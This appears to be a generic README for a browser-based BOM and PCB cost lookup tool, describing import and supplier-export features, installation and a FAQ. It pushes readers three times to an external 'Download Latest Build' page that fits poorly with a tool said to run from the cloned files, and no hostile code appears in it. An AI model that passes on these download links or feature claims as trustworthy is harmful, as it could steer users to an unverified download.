# BOM-tool v1.2 - BOM and PCB cost lookup tool 2026

> **Browser-based BOM and PCB cost lookup for comparing parts, checking PCB costs, and preparing purchase formats in version 1.2.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/loganlgycbrooks7031/bom-tool-bom-pcb-pricing?style=flat-square)](https://github.com/loganlgycbrooks7031/bom-tool-bom-pcb-pricing)

---

<p align="center">
  <a href="https://loganlgycbrooks7031.github.io/bom-tool-bom-pcb-pricing/">
    <img src="https://img.shields.io/badge/Download-BOM--tool%20Latest-brightgreen?style=for-the-badge" alt="Download BOM-tool">
  </a>
</p>

> **[Download Latest Build - BOM-tool v1.2](https://loganlgycbrooks7031.github.io/bom-tool-bom-pcb-pricing/)**

---

[Download Latest Build](https://loganlgycbrooks7031.github.io/bom-tool-bom-pcb-pricing/)

---

## Overview

BOM-tool is a web-based utility designed for bill of materials review and sourcing work. It brings part lists into a single place, helps you evaluate supplier choices, and supports moving from raw BOM input to purchase-ready output with less manual effort.

The tool is intended for individuals and teams that need a straightforward way to inspect component availability, keep sourcing progress visible, and view PCB cost information together with parts planning. In version 1.2, the emphasis is on file import, supplier export, inventory tracking, and order cache syncing for everyday procurement workflows.

---

## Key capabilities

- Import BOM files in xlsx, xls, and csv formats
- Compare sourcing options and choose backup parts when needed
- Export purchase-ready formats for Mouser, DigiKey, and Element14
- Look up PCB costs for supported board entries
- Sync order cache data for Mouser and DigiKey
- Track inventory alongside sourcing and order status
- Work through parts sourcing from a browser-based interface
- Support export-friendly workflows for procurement and review

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/loganlgycbrooks7031/bom-tool-bom-pcb-pricing.git
2. Open the project in a web server or supported browser environment.
3. Launch the app by loading the main HTML entry point for the repository.

If you are hosting it locally, make sure the files are served through a web server rather than opened in a restricted file context.

---

## Usage

1. Import a BOM file in `xlsx`, `xls`, or `csv` format.
2. Review the parsed parts list and compare sourcing options.
3. Select backup part choices where alternatives are needed.
4. Check PCB cost entries for supported boards.
5. Export purchase-ready files for the supplier format you need.
6. Sync order cache information for Mouser or DigiKey when available.
7. Use inventory and status tracking to follow sourcing progress.

Typical workflow:
- load BOM data
- validate components
- compare suppliers
- export procurement output
- monitor order status

---

## Configuration

Because BOM-tool runs in the browser, configuration is usually managed through the app UI or local project files, depending on how you deploy it.

Example project-level settings layout:
- import preferences
- supplier selection defaults
- cache sync options
- export format choices
- inventory tracking fields

If your deployment adds configuration files, keep them alongside the web assets and document any environment-specific values in your local setup notes.

---

## Requirements

- Web platform
- Modern browser support
- HTML-based project runtime
- Access to BOM source files in `xlsx`, `xls`, or `csv` format
- Network access for supplier-related lookup and sync workflows, where used
- Storage for exported files and cached order data

---

## FAQ

**How do I get updates?**  
Download the latest build from the project page and replace your local deployment with the current version.

**What file types can I import?**  
The tool supports BOM input in `xlsx`, `xls`, and `csv` formats.

**Can I export supplier-ready files?**  
Yes. It includes export options for Mouser, DigiKey, and Element14.

**Does it handle PCB pricing?**  
It includes lookup support for PCB cost entries tied to supported board records.

**Where is order data stored?**  
Order cache data can be synced for Mouser and DigiKey, and tracking depends on your deployment and browser storage behavior.

**What should I do if import fails?**  
Check the source file format, confirm the sheet layout, and try a fresh export from your BOM system before importing again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
